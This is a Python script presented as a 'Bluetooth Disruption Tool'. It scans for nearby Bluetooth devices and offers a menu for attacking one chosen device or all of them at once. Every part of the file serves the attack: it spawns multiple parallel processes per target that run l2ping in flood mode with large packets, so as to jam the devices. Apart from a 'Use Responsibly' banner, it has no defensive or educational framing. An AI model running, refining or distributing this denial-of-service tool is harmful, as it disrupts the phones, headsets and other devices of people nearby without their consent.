#!/usr/bin/env python3

import subprocess
import sys
import os
import re
from multiprocessing import Process, active_children
import signal

# ANSI Color Codes
COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m"
}

def color_text(text, color):
    return f"{COLORS[color]}{text}{COLORS['RESET']}"

def print_banner():
    banner = f"""
{COLORS['CYAN']}
██████╗ ██╗   ██╗██████╗ ██╗     ██╗   ██╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗
██████╔╝ ╚████╔╝ ██████╔╝██║     ██║   ██║█████╗  ██████╔╝
██╔═══╝   ╚██╔╝  ██╔══██╗██║     ██║   ██║██╔══╝  ██╔══██╗
██║        ██║   ██████╔╝███████╗╚██████╔╝███████╗██║  ██║
╚═╝        ╚═╝   ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
{COLORS['RESET']}
{color_text('Bluetooth Disruption Tool', 'MAGENTA')}
{color_text('>> Use Responsibly <<', 'RED')}
"""
    print(banner)

def check_root():
    if os.geteuid() != 0:
        print(color_text("[!] Run as root (e.g., sudo python3 bluetooth_jammer.py)", "RED"))
        sys.exit(1)

def scan_devices(interface='hci0'):
    print(color_text("\n[*] Scanning for nearby Bluetooth devices...", "YELLOW"))
    cmd = ['hcitool', '-i', interface, 'scan']
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate(timeout=15)
        devices = []
        for line in stdout.decode().splitlines():
            match = re.search(r'([0-9A-Fa-f:]{17})\s+(.*)', line.strip())
            if match:
                mac, name = match.groups()
                devices.append((mac, name))
        return devices
    except Exception as e:
        print(color_text(f"[!] Scan error: {str(e)}", "RED"))
        return []

def l2ping_flood(target_mac, interface='hci0'):
    cmd = ['l2ping', '-i', interface, '-s', '600', '-f', target_mac]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        proc.wait()
        return True
    except:
        return False

def start_attack(targets, interface='hci0', workers=5):
    global attack_processes
    attack_processes = []
    
    for target in targets:
        print(color_text(f"\n[*] Initializing attack on {target}...", "BLUE"))
        for _ in range(workers):
            p = Process(target=l2ping_flood, args=(target, interface))
            p.start()
            attack_processes.append(p)
            print(color_text(f"[+] Worker {p.pid} started for {target}", "GREEN"))

def stop_attack():
    global attack_processes
    if attack_processes:
        print(color_text("\n[*] Terminating all attack processes...", "YELLOW"))
        for p in attack_processes:
            p.terminate()
        print(color_text("[+] All workers terminated", "GREEN"))
    else:
        print(color_text("\n[!] No active attacks to stop", "RED"))

def show_attack_status():
    if attack_processes:
        active = sum(1 for p in attack_processes if p.is_alive())
        print(color_text(f"\n[•] Attack Status: {active} workers active", "CYAN"))
    else:
        print(color_text("\n[•] Attack Status: No active attacks", "YELLOW"))

def main_menu(devices):
    while True:
        print(color_text("\nMain Menu:", "BOLD"))
        print("1. Rescan Devices")
        print("2. Select Target from List")
        print("3. Attack All Devices")
        print("4. Stop Attacks")
        print("5. Exit")
        
        choice = input(color_text("\n>> ", "MAGENTA")).strip()
        
        if choice == '1':
            return scan_devices()
        elif choice == '2':
            if not devices:
                print(color_text("[!] No devices available. Rescan first!", "RED"))
                continue
            print(color_text("\nSelect Target:", "BOLD"))
            for idx, (mac, name) in enumerate(devices, 1):
                print(f"{idx}. {mac} - {name}")
            print("0. Return to Main Menu")
            
            try:
                selection = int(input(color_text("\n>> ", "MAGENTA")))
                if selection == 0:
                    continue
                return [devices[selection-1][0]]
            except:
                print(color_text("[!] Invalid selection", "RED"))
        elif choice == '3':
            if not devices:
                print(color_text("[!] No devices to attack. Rescan first!", "RED"))
                continue
            return [device[0] for device in devices]
        elif choice == '4':
            stop_attack()
        elif choice == '5':
            stop_attack()
            print(color_text("\n[+] Exiting...", "GREEN"))
            sys.exit(0)
        else:
            print(color_text("[!] Invalid choice", "RED"))

def main():
    check_root()
    print_banner()
    
    signal.signal(signal.SIGINT, lambda s, f: stop_attack())
    
    interface = 'hci0'
    devices = scan_devices(interface)
    
    if not devices:
        print(color_text("[!] No devices found in initial scan", "RED"))
        sys.exit(1)
        
    while True:
        targets = main_menu(devices)
        if targets:
            workers = input(color_text("\nEnter number of workers per target [1-10]: ", "MAGENTA")).strip()
            if not workers.isdigit() or not (1 <= int(workers) <= 10):
                print(color_text("[!] Invalid input. Using default 5 workers", "RED"))
                workers = 5
            else:
                workers = int(workers)
            
            try:
                start_attack(targets, interface, workers)
                input(color_text("\n[PRESS ENTER TO RETURN TO MENU]", "YELLOW"))
                stop_attack()
            except KeyboardInterrupt:
                stop_attack()

if __name__ == "__main__":
    attack_processes = []
    main()
